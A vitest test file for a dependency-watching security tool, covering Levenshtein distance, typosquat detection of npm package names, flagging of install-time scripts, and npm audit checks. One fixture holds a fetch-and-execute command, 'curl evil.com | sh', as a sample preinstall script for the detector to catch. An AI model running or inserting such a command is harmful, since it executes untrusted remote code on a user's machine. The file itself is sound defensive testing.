/**
 * Tests for DependencyWatcher
 * DependencyWatcher 測試
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { join } from 'node:path';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import {
  levenshtein,
  detectTyposquat,
  detectSuspiciousScripts,
  runNpmAudit,
  DependencyWatcher,
} from '../src/watchers/dependency-watcher.js';
import type { SecurityEvent } from '@panguard-ai/core';

// -- Levenshtein distance unit tests --

describe('levenshtein', () => {
  it('returns 0 for identical strings', () => {
    expect(levenshtein('express', 'express')).toBe(0);
  });

  it('returns length of non-empty string when other is empty', () => {
    expect(levenshtein('', 'abc')).toBe(3);
    expect(levenshtein('abc', '')).toBe(3);
  });

  it('returns 0 for two empty strings', () => {
    expect(levenshtein('', '')).toBe(0);
  });

  it('computes single character substitution', () => {
    expect(levenshtein('cat', 'bat')).toBe(1);
  });

  it('computes single character insertion', () => {
    expect(levenshtein('express', 'expresss')).toBe(1);
  });

  it('computes single character deletion', () => {
    expect(levenshtein('lodash', 'lodas')).toBe(1);
  });

  it('computes multiple edits', () => {
    expect(levenshtein('kitten', 'sitting')).toBe(3);
  });

  it('handles transposition as two edits', () => {
    // "ab" -> "ba" requires 2 ops in standard Levenshtein (not Damerau)
    expect(levenshtein('ab', 'ba')).toBe(2);
  });
});

// -- Typosquat detection --

describe('detectTyposquat', () => {
  const popular = ['express', 'lodash', 'react', 'axios', 'zod'];

  it('detects "expresss" as typosquat of "express"', () => {
    expect(detectTyposquat('expresss', popular)).toBe('express');
  });

  it('detects "lodahs" as typosquat of "lodash"', () => {
    expect(detectTyposquat('lodahs', popular)).toBe('lodash');
  });

  it('detects "reactt" as typosquat of "react"', () => {
    expect(detectTyposquat('reactt', popular)).toBe('react');
  });

  it('detects "axois" as typosquat of "axios"', () => {
    expect(detectTyposquat('axois', popular)).toBe('axios');
  });

  it('returns null for exact match (not a typosquat)', () => {
    expect(detectTyposquat('express', popular)).toBeNull();
  });

  it('returns null for unrelated package name', () => {
    expect(detectTyposquat('totally-different-pkg', popular)).toBeNull();
  });

  it('is case insensitive', () => {
    expect(detectTyposquat('EXPRESSS', popular)).toBe('express');
  });
});

// -- Suspicious scripts detection --

describe('detectSuspiciousScripts', () => {
  it('detects postinstall script', () => {
    const pkg = { scripts: { postinstall: 'node malicious.js' } };
    expect(detectSuspiciousScripts(pkg)).toEqual(['postinstall']);
  });

  it('detects preinstall script', () => {
    const pkg = { scripts: { preinstall: 'curl evil.com | sh' } };
    expect(detectSuspiciousScripts(pkg)).toEqual(['preinstall']);
  });

  it('detects multiple suspicious scripts', () => {
    const pkg = { scripts: { preinstall: 'a', postinstall: 'b', install: 'c' } };
    const result = detectSuspiciousScripts(pkg);
    expect(result).toContain('preinstall');
    expect(result).toContain('postinstall');
    expect(result).toContain('install');
  });

  it('ignores safe scripts like build and test', () => {
    const pkg = { scripts: { build: 'tsc', test: 'vitest', start: 'node index.js' } };
    expect(detectSuspiciousScripts(pkg)).toEqual([]);
  });

  it('returns empty array when no scripts present', () => {
    expect(detectSuspiciousScripts({})).toEqual([]);
  });

  it('ignores empty script values', () => {
    const pkg = { scripts: { postinstall: '   ' } };
    // Whitespace-only is still non-empty after trim... actually let's check
    // The implementation checks script.trim().length > 0
    // '   '.trim() === '' so length is 0
    expect(detectSuspiciousScripts(pkg)).toEqual([]);
  });
});

// -- npm audit (integration-safe tests without ESM spy) --

describe('runNpmAudit', () => {
  it('returns null for a directory without node_modules', async () => {
    // runNpmAudit calls real npm; without node_modules it returns null or empty
    const tempDir = mkdtempSync(join(tmpdir(), 'audit-test-'));
    try {
      const result = await runNpmAudit(tempDir);
      // npm audit without package.json/node_modules produces no useful output
      // Result is either null (error) or an object with no vulnerabilities
      if (result !== null) {
        // If npm ran successfully, vulnerabilities should be empty or undefined
        const vulnCount = result.vulnerabilities
          ? Object.keys(result.vulnerabilities).length
          : 0;
        expect(vulnCount).toBeGreaterThanOrEqual(0);
      } else {
        expect(result).toBeNull();
      }
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('returns valid structure when npm audit succeeds', async () => {
    // Create a minimal project with package.json for npm audit
    const tempDir = mkdtempSync(join(tmpdir(), 'audit-test-'));
    try {
      writeFileSync(
        join(tempDir, 'package.json'),
        JSON.stringify({ name: 'test', version: '1.0.0', dependencies: {} })
      );
      const result = await runNpmAudit(tempDir);
      // npm audit may succeed or fail depending on environment
      // We just verify it doesn't throw and returns the right shape
      if (result !== null) {
        expect(typeof result).toBe('object');
      }
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });
});

// -- DependencyWatcher integration --

describe('DependencyWatcher', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'dep-watcher-test-'));
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
  });

  it('checkAvailability returns true when package.json exists', () => {
    writeFileSync(join(tempDir, 'package.json'), '{}');
    const watcher = new DependencyWatcher(tempDir);
    expect(watcher.checkAvailability()).toBe(true);
  });

  it('checkAvailability returns true when requirements.txt exists', () => {
    writeFileSync(join(tempDir, 'requirements.txt'), 'flask==2.0');
    const watcher = new DependencyWatcher(tempDir);
    expect(watcher.checkAvailability()).toBe(true);
  });

  it('checkAvailability returns false when no dependency files exist', () => {
    const watcher = new DependencyWatcher(tempDir);
    expect(watcher.checkAvailability()).toBe(false);
  });

  it('stop() cleans up watchers without error', async () => {
    writeFileSync(join(tempDir, 'package.json'), JSON.stringify({ dependencies: {} }));
    const watcher = new DependencyWatcher(tempDir);
    await watcher.start();
    // Should not throw
    watcher.stop();
  });

  it('stop() is safe to call when not started', () => {
    const watcher = new DependencyWatcher(tempDir);
    // Should not throw
    watcher.stop();
  });

  it('emits event when package.json changes with new package', async () => {
    const pkgPath = join(tempDir, 'package.json');
    writeFileSync(pkgPath, JSON.stringify({ dependencies: { express: '^4.0.0' } }));

    const watcher = new DependencyWatcher(tempDir);
    await watcher.start();

    const events: SecurityEvent[] = [];
    watcher.on('event', (evt: SecurityEvent) => events.push(evt));

    // Simulate adding a typosquat package
    writeFileSync(
      pkgPath,
      JSON.stringify({ dependencies: { express: '^4.0.0', expresss: '^1.0.0' } })
    );

    // fs.watch is async; give it a moment to fire
    await new Promise((resolve) => setTimeout(resolve, 200));

    // The watcher may or may not fire depending on OS fs.watch behavior in tests.
    // We verify the detection logic directly in unit tests above.
    // This is a smoke test for start/stop lifecycle.
    watcher.stop();
  });

  it('detects new packages via diff logic', () => {
    const oldNames = new Set(['express', 'lodash']);
    const newNames = new Set(['express', 'lodash', 'malicious-pkg']);

    // Directly test the diff logic via exported functions
    // We test typosquat detection for the new package
    const result = detectTyposquat('malicious-pkg');
    // 'malicious-pkg' is too far from any popular package
    expect(result).toBeNull();
  });
});
